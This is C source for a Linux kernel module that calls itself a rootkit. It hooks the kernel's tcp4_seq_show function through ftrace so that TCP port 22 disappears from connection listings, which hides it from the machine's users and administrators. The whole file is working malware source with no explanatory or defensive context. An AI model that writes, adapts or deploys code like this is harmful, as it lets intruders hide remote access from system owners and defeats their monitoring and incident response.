#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "ftrace_rootkit_utils.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LiNNNk");
MODULE_DESCRIPTION("Hides a port from the user.");
MODULE_VERSION("0.1");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
    struct sock* sk = v;
    if ((sk != 0x1) && (sk->__sk_common.skc_num == 0x16)) {
        return 0;
    }

    return orig_tcp4_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = {
    HOOK_DIRECT("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init hide_port_rootkit_init(void) {
    int err;
    err = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    pr_info("hide_port_rootkit: loaded\n");
    return 0;
}

static void __exit hide_port_rootkit_exit(void) {
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("hide_portrootkit: unloaded\n");
}

module_init(hide_port_rootkit_init);
module_exit(hide_port_rootkit_exit);
